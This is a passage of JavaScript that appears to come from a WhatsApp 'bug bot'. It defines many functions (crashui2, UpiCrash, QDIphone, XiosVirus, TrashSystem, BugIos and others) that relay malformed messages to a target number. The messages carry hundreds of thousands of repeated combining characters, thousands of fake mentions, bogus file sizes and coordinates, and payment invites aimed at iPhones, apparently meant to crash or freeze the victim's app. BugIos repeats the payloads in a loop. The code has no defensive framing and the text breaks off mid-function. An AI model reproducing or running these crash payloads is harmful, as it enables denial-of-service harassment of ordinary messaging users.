    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
async function systemUi2(target, Ptcp = false) {
    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "Caywzz",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"Caywzz!\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "Caywzz",
                                    sections: [
                                        {
                                            title: "Caywzz",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
	async function crashui2(target, ptcp = false) {
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "\u0000" + "ꦾ".repeat(300000)  + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendOfferCall(target) {
    try {
        await cay.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function InVisiLoc(target, ptcp = false) {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                            "locationMessage": {
                                "degreesLatitude": -999.03499999999999,
                                "degreesLongitude": 922.999999999999,
                                "name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                                "address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                                "jpegThumbnail": o,
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: ""
                        },
                        nativeFlowMessage: {
                            messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                            buttons: [{
                                    name: "call_permission_request",
                                    buttonParamsJson: {}
                                }
                            ],
                        },
                    }
                }
            }
        }), {
            userJid: target,
            quoted: QBug
        }
    );
    await cay.relayMessage(target, etc.message, ptcp ? {
        participant: {
            jid: target
        }
    } : {});
    console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
};
async function bokep(target, ptcp = false) {
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(3)
                    },
                    nativeFlowMessage: {
                        "buttons": [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"YouTube 🍒\",\"url\":\"https://youtube.com/@dgxeon\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"Telegram 💙\",\"url\":\"https://t.me/+WEsVdEN2B9w4ZjA9\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": "{\"display_text\":\"Owner 👤\",\"title\":\"Owner 👤\",\"id\":\".owner\"}"
                            }
                        ],
                        "messageParamsJson": "{\"caption\":\"Halo\"}"
                    },
                    contextInfo: {
                        mentionedJid: [
                            "6285727763935@s.whatsapp.net"
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendContact(target) {
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:Caywzz\nTEL:+6289673110783\nEND:VCARD`;

    await cay.relayMessage(target, {
        contactMessage: {
            contacts: [
                {
                    displayName: "Caywzz",
                    jid: "+6289673110783@s.whatsapp.net",
                    vcard: vcard
                }
            ]
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//bug ios
async function UpiCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await cay.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/Garammanis",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
        async function caywzzaja_notif(target) {
			await cay.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
					         text: "ꦾ".repeat(250000) + "@0".repeat(100000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
     
    async function QPayIos(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
            async function invccombine(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "caywzzaja",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: `🌌`
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await cay.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
    //

    async function IosMJ(target, Ptcp = false) {
      await cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Garammanis",
                mediaUrl: "https://t.me/Garammanis",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Garammanis",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    async function TrashSystem(target, caywzzimg, Ptcp = true) {
			await cay.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
								mentionedJid: [target, "13135550002@s.whatsapp.net"],
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: caywzzimg,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮̤͟\n" + "ꦽ".repeat(45000) + "@0".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟', url: \"https://t.me/Garammanis\", merchant_url: \"https://t.me/Garammanis\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"));
		};

async function InvisibleLoadFast(target, ptcp = true) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "🌸 - 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await cay.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
    
    async function InVisiXz(target, caywzzimg, cct = false, ptcp = false) {
   let etc = generateWAMessageFromContent(target,
    proto.Message.fromObject({
     viewOnceMessage: {
      message: {
       interactiveMessage: {
        header: {
         title: "",
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 9007199254740991,
          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
          fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1723855952",
          contactVcard: true,
          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
          jpegThumbnail: caywzzimg,
         },
         hasMediaAttachment: true
        },
        body: {
         text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
        },
        nativeFlowMessage: {
         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
         buttons: [
          cct ? {
           name: "single_select",
           buttonParamsJson: "{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
          } : {
           name: "payment_method",
           buttonParamsJson: ""
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}"
          },
          {
           name: "payment_method",
           buttonParamsJson: "{}"
          },
          {
           name: "single_select",
           buttonParamsJson: "{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\",\"sections\":[{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\",\"rows\":[]}]}"
          },
          {
           name: "galaxy_message",
           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
          },
          {
           name: "mpm",
           buttonParamsJson: "{}"
          }
         ]
        }
       }
      }
     }
    }), {
     userJid: target,
     quoted: QBug
    }
   );

   await cay.relayMessage(target, etc.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
  };
    async function XiosVirus(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 15; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
